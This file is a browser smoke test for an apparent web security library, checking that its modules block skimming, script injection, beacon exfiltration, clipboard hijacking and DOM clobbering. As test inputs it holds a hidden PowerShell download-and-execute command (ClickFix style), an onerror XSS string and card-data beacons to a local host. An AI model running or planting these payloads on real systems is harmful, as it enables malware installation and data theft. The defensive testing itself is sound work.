/**
 * Real-browser smoke test for the built UMD bundle.
 *
 *   npm run build && npm run test:browser            (Chrome)
 *   npm run test:browser -- firefox                   (Firefox)
 *
 * Serves the page on http://localhost:4801 and a "third-party" script on
 * http://127.0.0.1:4802 (a different origin), so call-stack attribution and
 * cross-origin blocking are tested for real. Browser paths can be set with
 * CHROME_PATH / FIREFOX_PATH.
 */
import puppeteer from 'puppeteer-core'
import http from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const here = path.dirname(fileURLToPath(import.meta.url))
const root = path.resolve(here, '../..')
const bundle = path.join(root, 'dist/hyde-security-js.umd.js')
if (!fs.existsSync(bundle)) {
  console.error('dist/hyde-security-js.umd.js missing — run npm run build first')
  process.exit(1)
}

function serve(dir, port, withHeaders) {
  return new Promise(resolve => {
    const server = http.createServer((req, res) => {
      const urlPath = new URL(req.url, 'http://x').pathname
      const file = urlPath === '/hyde-security-js.umd.js' ? bundle : path.join(dir, urlPath === '/' ? 'index.html' : urlPath)
      if (!file.startsWith(dir) && file !== bundle) { res.writeHead(403); return res.end() }
      if (!fs.existsSync(file)) { res.writeHead(404); return res.end() }
      const headers = { 'content-type': file.endsWith('.js') ? 'text/javascript' : 'text/html', 'access-control-allow-origin': '*' }
      if (withHeaders) Object.assign(headers, {
        'content-security-policy': "script-src 'self' http://127.0.0.1:4802 'unsafe-inline'; object-src 'none'",
        'x-content-type-options': 'nosniff'
      })
      res.writeHead(200, headers)
      if (req.method === 'HEAD') return res.end()
      fs.createReadStream(file).pipe(res)
    }).listen(port, () => resolve(server))
  })
}
const servers = await Promise.all([
  serve(path.join(here, 'fixtures/site'), 4801, true),
  serve(path.join(here, 'fixtures/third-party'), 4802, false)
])

const browserName = process.argv[2] || 'chrome'
const browser = await puppeteer.launch(browserName === 'firefox'
  ? { browser: 'firefox', executablePath: process.env.FIREFOX_PATH || '/usr/bin/firefox', headless: true }
  : { executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', headless: true, args: ['--no-sandbox'] })
const page = await browser.newPage()
const errors = []
page.on('pageerror', e => errors.push('pageerror: ' + e.message))
page.on('console', m => { if (m.type() === 'error') errors.push('console: ' + m.text()) })
await page.goto('http://localhost:4801/', { waitUntil: 'load' })

const results = {}
const check = (name, ok, info) => { results[name] = ok ? 'PASS' : `FAIL ${info !== undefined ? JSON.stringify(info) : ''}` }

check('version', await page.evaluate(() => HydeSecurity.getVersion()) === '2.0.0')

// init balanced: should not throw or log errors
await page.evaluate(() => {
  window.__events = []
  HydeSecurity.init({ mode: 'balanced', onThreatDetected: e => window.__events.push(e.type) })
})

// 1. skimmerGuard vs a real cross-origin script
await page.evaluate(() => HydeSecurity.modules.skimmerGuard.enable({ mode: 'enforce' }))
await page.addScriptTag({ url: 'http://127.0.0.1:4802/skim.js' })
const skim = await page.evaluate(() => {
  const el = document.getElementById('cc')
  el.dispatchEvent(new Event('input'))
  return { read: window.__skim.read, listener: window.__skim.listenerWorks(), firstParty: el.value, events: window.__events.slice() }
})
check('skimmer: third-party read blanked', skim.read === '', skim)
check('skimmer: third-party listener blocked', skim.listener === 0, skim)
check('skimmer: first-party read works', skim.firstParty === '4111111111111111', skim)
check('skimmer: events reported', skim.events.includes('sensitive_field_read') && skim.events.includes('sensitive_listener_added'), skim.events)
await page.evaluate(() => HydeSecurity.modules.skimmerGuard.disable())

// 2. scriptGuard stops a dynamic inline script from executing
const sg = await page.evaluate(() => {
  const g = HydeSecurity.modules.scriptGuard
  const okCode = 'window.__okRan = 1'
  g.enable({ mode: 'enforce', allowInlineHashes: [g.hashInline(okCode)], trackChanges: false })
  const bad = document.createElement('script'); bad.textContent = 'window.__badRan = 1'; document.body.appendChild(bad)
  const ok = document.createElement('script'); ok.textContent = okCode; document.body.appendChild(ok)
  const ext = document.createElement('script'); ext.src = 'http://127.0.0.1:4802/skim.js'; document.body.appendChild(ext)
  g.disable()
  return { badRan: !!window.__badRan, okRan: !!window.__okRan, extType: ext.getAttribute('type'), inv: g.getInventory().length }
})
check('scriptGuard: unauthorized inline did NOT run', !sg.badRan, sg)
check('scriptGuard: allowlisted inline ran', sg.okRan, sg)
check('scriptGuard: unauthorized external neutralized', sg.extType === 'text/hyde-blocked', sg)

// 3. networkFirewall
const fw = await page.evaluate(async () => {
  const f = HydeSecurity.modules.networkFirewall
  f.enable({ allow: [] })
  let fetchBlocked = false
  try { await fetch('http://127.0.0.1:4802/skim.js') } catch (e) { fetchBlocked = /blocked/.test(e.message) }
  const sameOrigin = (await fetch('/index.html')).ok
  const img = new Image(); img.src = 'http://127.0.0.1:4802/pixel.gif?cc=4111'
  const beacon = navigator.sendBeacon('http://127.0.0.1:4802/b', 'x')
  let wsBlocked = false
  try { new WebSocket('ws://127.0.0.1:4802/') } catch (e) { wsBlocked = true }
  f.disable()
  return { fetchBlocked, sameOrigin, imgSrc: img.getAttribute('src'), beacon, wsBlocked, restored: !String(window.fetch).includes('check') }
})
check('firewall: cross-origin fetch blocked', fw.fetchBlocked, fw)
check('firewall: same-origin allowed', fw.sameOrigin, fw)
check('firewall: image beacon blocked', fw.imgSrc === null, fw)
check('firewall: sendBeacon blocked', fw.beacon === false, fw)
check('firewall: WebSocket blocked', fw.wsBlocked, fw)

// 4. clipboardGuard (already on via balanced)
const clip = await page.evaluate(async () => {
  if (!navigator.clipboard) return { skipped: true }
  try { await navigator.clipboard.writeText('powershell -w hidden -c "iwr https://1.2.3.4/x | iex"'); return { blocked: false } }
  catch (e) { return { blocked: /HydeSecurity/.test(e.message), msg: e.message } }
})
check('clipboard: ClickFix payload blocked', clip.skipped || clip.blocked, clip)

// 5. agentShield with real computed styles
const ag = await page.evaluate(() => HydeSecurity.modules.agentShield.scan({ root: document.getElementById('ugc') }).map(f => f.hiddenBy))
check('agentShield: same-color hidden injection found', ag.length === 1 && ag[0].includes('same-color'), ag)

// 6. Trusted Types (real browser)
const tt = await page.evaluate(() => {
  const t = HydeSecurity.modules.trustedTypes
  if (!t.isSupported()) return { supported: false }
  const p = t.createPolicy({ name: 'smoke' })
  const html = p.createHTML('<img src=x onerror=alert(1)>ok').toString()
  return { supported: true, html, enforced: t.isEnforced() }
})
check('trustedTypes: policy sanitizes', !tt.supported || (tt.html.includes('ok') && !tt.html.includes('onerror')), tt)

// 7. messageGuard firewall incl. window.onmessage, real postMessage
const mg = await page.evaluate(() => new Promise(resolve => {
  const g = HydeSecurity.modules.messageGuard
  g.enable({ allowedOrigins: ['https://trusted.example'] })
  let viaListener = 0, viaProp = 0
  window.addEventListener('message', () => viaListener++)
  window.onmessage = () => viaProp++
  window.postMessage('hi', '*')
  setTimeout(() => {
    g.disable()
    window.onmessage = null
    resolve({ viaListener, viaProp })
  }, 100)
}))
check('messageGuard: blocks listener + onmessage from unlisted origin', mg.viaListener === 0 && mg.viaProp === 0, mg)

// 8. DOM clobbering in a real engine
const clob = await page.evaluate(() => {
  document.body.insertAdjacentHTML('beforeend', '<form name="cookie"></form><a id="config" href="#"></a>')
  const r = HydeSecurity.modules.prototypeGuard.scanClobbering().map(x => x.name)
  return { names: r, docCookieIsElement: document.cookie instanceof Element }
})
check('prototypeGuard: clobbering found', clob.names.includes('cookie') && clob.names.includes('config'), clob)

// 9. Audit reads real headers
const audit = await page.evaluate(async () => {
  const r = await HydeSecurity.audit()
  return { grade: r.grade, score: r.score, ids: r.findings.map(f => f.id), csp: !!r.headers['content-security-policy'] }
})
check('audit: fetched headers', audit.csp, audit)
check('audit: flags unsafe-inline', audit.ids.includes('csp-unsafe-inline'), audit)
check('audit: flags DOM clobbering of document.cookie', audit.ids.includes('dom-clobbering'), audit)
const balanced = await page.evaluate(() => { HydeSecurity.init({ mode: 'balanced' }); return { devtools: HydeSecurity.modules.antiDevtools.isEnabled() } })
check('balanced mode does not start anti-devtools', balanced.devtools === false, balanced)

// 10. encryption in a real browser
const enc = await page.evaluate(async () => {
  const c = await HydeSecurity.encryptText('hello', 'browser-passphrase')
  return { ok: (await HydeSecurity.decryptText(c, 'browser-passphrase')) === 'hello', prefix: c.slice(0, 6) }
})
check('encryption: AES-GCM round trip', enc.ok && enc.prefix === 'hyde2.', enc)

// 11. destroy restores the page
const destroyed = await page.evaluate(() => { HydeSecurity.destroy(); return EventTarget.prototype.addEventListener.toString().includes('[native code]') })
check('destroy: addEventListener restored to native', destroyed)

// Firefox reports the bundled devtools-detector's caught Function('return this') shim under CSP (UMD only; see README)
const unexpected = errors.filter(e => !/net::ERR|Failed to load resource|404/.test(e) && !/blocked a JavaScript eval/.test(e))
check('no unexpected console/page errors', unexpected.length === 0, unexpected)

console.log(`\n== ${browserName} ==`)
for (const [k, v] of Object.entries(results)) console.log(`${v.startsWith('PASS') ? '✓' : '✗'} ${k}${v.startsWith('PASS') ? '' : '  ' + v}`)
await browser.close()
servers.forEach(s => s.close())
const failed = Object.values(results).filter(v => !v.startsWith('PASS')).length
console.log(failed ? `\n${failed} check(s) failed` : '\nAll checks passed')
process.exit(failed ? 1 : 0)
